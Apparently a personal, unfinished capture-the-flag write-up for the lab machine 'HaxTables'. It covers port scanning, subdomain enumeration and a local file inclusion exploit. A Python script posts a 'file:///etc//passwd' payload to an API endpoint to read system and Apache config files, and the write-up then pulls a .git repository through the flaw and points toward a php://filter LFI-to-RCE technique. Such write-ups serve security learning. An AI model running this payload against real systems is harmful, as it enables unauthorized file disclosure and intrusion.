## RUSTSCAN:
`PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIzAFurw3qLK4OEzrjFarOhWslRrQ3K/MDVL2opfXQLI+zYXSwqofxsf8v2MEZuIGj6540YrzldnPf8CTFSW2rk=
|   256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPTtbUicaITwpKjAQWp8Dkq1glFodwroxhLwJo6hRBUK
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52 ((Ubuntu))
|_http-title: HaxTables
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port`
* * *
## SSH:
So far we can't do that much with SSH on port 22 or not untill we can find some credentials to login.
SSH is pretty new and no known Exploits are in the Wild.
* * *
## HTTP:
Some subdomains have been found:
![ee639701212dc389a318d2c769f8a380.png](../../_resources/ee639701212dc389a318d2c769f8a380.png)

Now surfing the website and opening the API tab we can find some informations about the API, and maybe a possible Subdomain?
![eea0d011acbb8a9bf4f6aa0d2d3d185e.png](../../_resources/eea0d011acbb8a9bf4f6aa0d2d3d185e.png)

let's add those subdomains and add continue with enumeration...
Now i tried do some manual enumeration with lfi but no success on the main website:
![e88ecd656e776312ad11621271c725df.png](../../_resources/e88ecd656e776312ad11621271c725df.png)

Then trying to do a Webdirectory fuzzing on the Api subdomains we can find 3 different API versions:
![af5589d537b468bac5dcc899b8739fde.png](../../_resources/af5589d537b468bac5dcc899b8739fde.png)

Now checking what API pages gives us, seems like this can be exploited as LFI??
import requests
json_data = {
    'action': 'str2hex',
    'file_url' : 'file:///etc//passwd'
}
response = requests.post('http://api.haxtables.htb/v3/tools/string/index.php', json=json_data)
print(response.text)

Running this script should give us back the hex string of a LFI...
![8bf49a36c0251dfb5e4a28275c699081.png](../../_resources/8bf49a36c0251dfb5e4a28275c699081.png)

trying to read for /etc/hosts:
![9c56192aa9a44a89c24146366e10b587.png](../../_resources/9c56192aa9a44a89c24146366e10b587.png)
![ee0e1ee925e5f76fce6e55fdf41d5aee.png](../../_resources/ee0e1ee925e5f76fce6e55fdf41d5aee.png)

We know there are the other website image, so let's check if we can read the Apache sites config? Checking the default "site-enabled" path from my linux machine we try to fetch all available websites:
![0fb66e02aa55cc1499854f13fba53cff.png](../../_resources/0fb66e02aa55cc1499854f13fba53cff.png)
`<VirtualHost *:80>
	ServerName haxtables.htb
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
<VirtualHost *:80>
	ServerName api.haxtables.htb
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/api
	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
<VirtualHost *:80>
        ServerName image.haxtables.htb
        ServerAdmin webmaster@localhost    
	DocumentRoot /var/www/image
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
	#SecRuleEngine On
	<LocationMatch />
  		SecAction initcol:ip=%{REMOTE_ADDR},pass,nolog,id:'200001'
  		SecAction "phase:5,deprecatevar:ip.somepathcounter=1/1,pass,nolog,id:'200002'"
  		SecRule IP:SOMEPATHCOUNTER "@gt 5" "phase:2,pause:300,deny,status:509,setenv:RATELIMITED,skip:1,nolog,id:'200003'"
  		SecAction "phase:2,pass,setvar:ip.somepathcounter=+1,nolog,id:'200004'"
  		Header always set Retry-After "10" env=RATELIMITED
	</LocationMatch>
	ErrorDocument 429 "Rate Limit Exceeded"
        <Directory /var/www/image>
                Deny from all
                Allow from 127.0.0.1
                Options Indexes FollowSymLinks
                AllowOverride All
                Require all granted
        </DIrectory>
</VirtualHost>
`

Now that we know we have the local path of the Image website shall we try to read for example the index.php? (when i tried the website was not working which could be cause it is only available from inside...)
![696d94f9cbe3e9434ea801d091aecf35.png](../../_resources/696d94f9cbe3e9434ea801d091aecf35.png)
We see that images have a file utils that we couldn't find before with dirbuster:
![da04fc460c9d88803c84a538d035fb73.png](../../_resources/da04fc460c9d88803c84a538d035fb73.png)

let's do same and read it:
![9300a45f3d299e999b06be26bc782a33.png](../../_resources/9300a45f3d299e999b06be26bc782a33.png)

Seems like it logs the changes to git so let's try to do same and read that bash script:
![1d7b37437a9c3e0d12f5c65f19960be8.png](../../_resources/1d7b37437a9c3e0d12f5c65f19960be8.png)

Now we know that we should have a git repo under /var/www/image/.git and checking how is the .git folder structure since we can't run any commands or do a git dumper we must do a manual LFI on singular files.
https://www.delftstack.com/howto/git/git-directories/
![d6decb4b0c14eb53833b3361d90b150a.png](../../_resources/d6decb4b0c14eb53833b3361d90b150a.png)

From here we can try to read files:
![2bb1c42dac52d5d02ce3da84fbe5ecee.png](../../_resources/2bb1c42dac52d5d02ce3da84fbe5ecee.png)

Then HEAD file which is the Master branch is pointing to /refs/heads/master so can we find something there???
Edit: Here i had to check for tips and apparently seems like git-dumper was not working since it was getting 403 and it was failing there but the key was to use another tool instead:
https://github.com/internetwache/GitTools

This will ignore the 403 and will dump the whole .git folder. Then the git log is not working so now we need to reconstruct the website:
![f75ea6e0f50c49437b8567d9c76ea870.png](../../_resources/f75ea6e0f50c49437b8567d9c76ea870.png)

Using this extractor we can reconstruct the "broken" git repo and see what logs and code can we read... Edit: is not working but i had to give up and check for tips.

Apparently doing what we did with api LFI we could dump the api/hanlder.php and check the code:
![1a18aa89a5e989f7eb7db446c9984d6c.png](../../_resources/1a18aa89a5e989f7eb7db446c9984d6c.png)

And knowing that the convert program uses the php://filter: https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters#tools



* * *